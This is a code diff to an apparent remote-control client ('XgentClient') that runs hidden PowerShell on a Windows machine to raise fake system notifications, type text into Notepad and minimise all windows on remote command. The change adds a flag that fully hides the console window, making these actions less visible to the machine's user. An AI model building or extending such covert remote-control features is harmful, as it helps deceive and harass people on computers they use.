@@ -6582,7 +6582,10 @@ class XgentClient:
                 "  Start-Sleep -Milliseconds 700 "
                 "}; $notify.Dispose()"
             )
-            subprocess.Popen(["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps])
+            subprocess.Popen(
+                ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps],
+                creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
+            )
             text = "🔔 Серия из 5 фейковых системных уведомлений запущена в трее!"
             ok = True
         except Exception as exc:
@@ -6630,7 +6633,10 @@ class XgentClient:
             f"  $ws.SendKeys($_); Start-Sleep -Milliseconds 120 "
             f"}}"
         )
-        subprocess.Popen(["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps])
+        subprocess.Popen(
+            ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps],
+            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
+        )
         self._publish_response("output", {"type": "prank_open_notepad_type", "device_id": DEVICE_ID, "ok": True, "text": f"📝 Блокнот открыт, текст '{clean_msg[:40]}...' печатается!"})
 
     def _do_prank_hacker_typer(self, payload: dict) -> None:
@@ -6670,7 +6676,10 @@ class XgentClient:
         """Сворачивание всех открытых окон."""
         try:
             ps = "(New-Object -ComObject Shell.Application).MinimizeAll()"
-            subprocess.Popen(["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps])
+            subprocess.Popen(
+                ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps],
+                creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
+            )
             text = "📉 Все открытые окна свернуты на рабочий стол!"
             ok = True
         except Exception as exc:
